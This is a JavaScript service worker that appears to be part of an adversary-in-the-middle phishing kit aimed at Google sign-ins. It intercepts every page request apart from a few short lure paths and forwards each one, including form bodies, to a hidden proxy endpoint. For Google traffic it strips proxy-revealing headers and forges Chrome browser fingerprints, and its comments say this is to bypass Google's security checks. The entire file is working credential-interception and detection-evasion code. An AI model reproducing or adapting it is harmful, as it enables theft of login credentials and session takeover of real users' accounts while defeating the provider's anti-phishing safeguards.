self.addEventListener("install", (event) => {
    self.skipWaiting();
});

self.addEventListener("activate", (event) => {
    event.waitUntil(clients.claim());
});

self.addEventListener("fetch", (event) => {
    const url = new URL(event.request.url);
    
    // Don't intercept our short URLs - let them redirect naturally
    if (url.pathname === '/c' || url.pathname === '/corp' || url.pathname === '/corporate' ||
        url.pathname === '/p' || url.pathname === '/personal' ||
        url.pathname === '/g' || url.pathname === '/google') {
        return;
    }
    
    // Don't intercept the service worker itself or other static files
    if (url.pathname.includes('service_worker') || url.pathname === '/favicon.ico') {
        return;
    }
    
    event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
    const proxyRequestURL = `${self.location.origin}/lNv1pC9AWPUY4gbidyBO`;

    try {
        // Create headers object and enhance for Google
        const headers = Object.fromEntries(request.headers.entries());
        
        // Add Google-specific headers to bypass security checks
        if (request.url.includes('accounts.google.com') || request.url.includes('google.com')) {
            // Remove ALL proxy-related headers that Google detects
            const proxyHeaders = [
                'x-forwarded-proto', 'x-forwarded-port', 'x-forwarded-host', 'x-forwarded-for',
                'x-real-ip', 'via', 'forwarded', 'x-arr-log-id', 'x-arr-ssl', 'x-site-deployment-id',
                'was-default-hostname', 'x-appservice-proto', 'x-forwarded-tlsversion', 'x-original-url',
                'x-waws-unencoded-url', 'x-client-ip', 'x-client-port', 'disguised-host', 'client-ip',
                'max-forwards', 'x-forwarded-by', 'x-cluster-client-ip', 'x-remote-ip', 'x-remote-addr',
                'x-proxy-id', 'x-proxy-user', 'x-proxy-pass', 'proxy-connection', 'proxy-authorization'
            ];
            
            proxyHeaders.forEach(header => delete headers[header]);
            
            // Add legitimate browser headers
            headers['sec-gpc'] = '1';
            headers['sec-fetch-dest'] = 'document';
            headers['sec-fetch-mode'] = 'navigate';
            headers['sec-fetch-site'] = 'none';
            headers['sec-fetch-user'] = '?1';
            headers['sec-ch-ua'] = '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"';
            headers['sec-ch-ua-mobile'] = '?0';
            headers['sec-ch-ua-platform'] = '"Windows"';
            headers['sec-ch-ua-platform-version'] = '"15.0.0"';
            headers['sec-ch-ua-arch'] = '"x86"';
            headers['sec-ch-ua-bitness'] = '"64"';
            headers['sec-ch-ua-model'] = '""';
            headers['sec-ch-ua-full-version'] = '"120.0.6099.130"';
            headers['sec-ch-ua-full-version-list'] = '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.130", "Google Chrome";v="120.0.6099.130"';
            headers['device-memory'] = '8';
            headers['viewport-width'] = '1920';
            headers['rtt'] = '50';
            headers['downlink'] = '10';
            headers['accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
            headers['accept-language'] = 'en-US,en;q=0.9';
            headers['accept-encoding'] = 'gzip, deflate, br';
            headers['cache-control'] = 'max-age=0';
            headers['dnt'] = '1';
            headers['upgrade-insecure-requests'] = '1';
        }
        
        const proxyRequest = {
            url: request.url,
            method: request.method,
            headers: headers,
            body: await request.text(),
            referrer: request.referrer,
            mode: request.mode
        };
        
        return fetch(proxyRequestURL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify(proxyRequest),
            redirect: "manual",
            mode: "same-origin"
        });
    }
    catch (error) {
        console.error(`Fetching ${proxyRequestURL} failed: ${error}`);
    }
}